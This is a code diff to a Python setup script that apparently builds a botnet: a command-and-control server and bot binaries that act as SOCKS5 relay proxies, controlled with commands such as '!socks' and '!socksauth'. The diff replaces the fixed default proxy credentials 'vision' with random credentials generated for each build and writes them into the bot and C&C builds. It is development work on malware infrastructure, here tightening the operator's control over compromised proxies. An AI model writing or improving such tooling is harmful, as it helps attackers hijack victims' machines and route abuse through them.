@@ -885,8 +885,8 @@ def print_summary(config: dict):
         print(
             f"  {Colors.YELLOW}Relay Endpoints:{Colors.RESET} {Colors.DIM}None (use !socks <relay:port> at runtime){Colors.RESET}"
         )
-    proxy_u = config.get("proxy_user", "vision")
-    proxy_p = config.get("proxy_pass", "vision")
+    proxy_u = config.get("proxy_user", "")
+    proxy_p = config.get("proxy_pass", "")
     print(
         f"  {Colors.YELLOW}Proxy Auth:{Colors.RESET}      {Colors.BRIGHT_WHITE}{proxy_u}:{proxy_p}{Colors.RESET}"
     )
@@ -1106,21 +1106,13 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     else:
         info("No pre-configured relay endpoints (use !socks <relay:port> at runtime)")
 
-    # Default SOCKS5 proxy credentials
-    print(
-        f"\n{Colors.DIM}   Default credentials for SOCKS5 proxy access.{Colors.RESET}"
-    )
-    print(
-        f"{Colors.DIM}   Users connect with: relay_host:port:username:password{Colors.RESET}"
-    )
-    print(
-        f"{Colors.DIM}   Can be changed at runtime via !socksauth command.{Colors.RESET}\n"
-    )
-    proxy_user = prompt("Default proxy username", "vision")
-    proxy_pass = prompt("Default proxy password", "vision")
+    # Default SOCKS5 proxy credentials — auto-generated, unique per build
+    _chars = string.ascii_letters + string.digits
+    proxy_user = "".join(random.choice(_chars) for _ in range(12))
+    proxy_pass = "".join(random.choice(_chars) for _ in range(12))
     config["proxy_user"] = proxy_user
     config["proxy_pass"] = proxy_pass
-    success(f"Proxy auth: {proxy_user}:{proxy_pass}")
+    success(f"Proxy auth (auto-generated): {proxy_user}:{proxy_pass}")
 
     # Step 2: Security Tokens & AES Key
     print_step(2, 5, "Security Token & Key Generation")
@@ -1248,13 +1240,9 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
         info("No relay endpoints configured")
 
     # Update default proxy credentials (bot + CNC)
-    update_proxy_credentials(
-        bot_path, config.get("proxy_user", "vision"), config.get("proxy_pass", "vision")
-    )
-    update_cnc_proxy_credentials(
-        cnc_path, config.get("proxy_user", "vision"), config.get("proxy_pass", "vision")
-    )
-    success(f"Proxy credentials: {config.get('proxy_user', 'vision')}:{config.get('proxy_pass', 'vision')}")
+    update_proxy_credentials(bot_path, config["proxy_user"], config["proxy_pass"])
+    update_cnc_proxy_credentials(cnc_path, config["proxy_user"], config["proxy_pass"])
+    success(f"Proxy credentials: {config['proxy_user']}:{config['proxy_pass']}")
 
     # Step 5: Build
     print_step(5, 5, "Building Binaries")
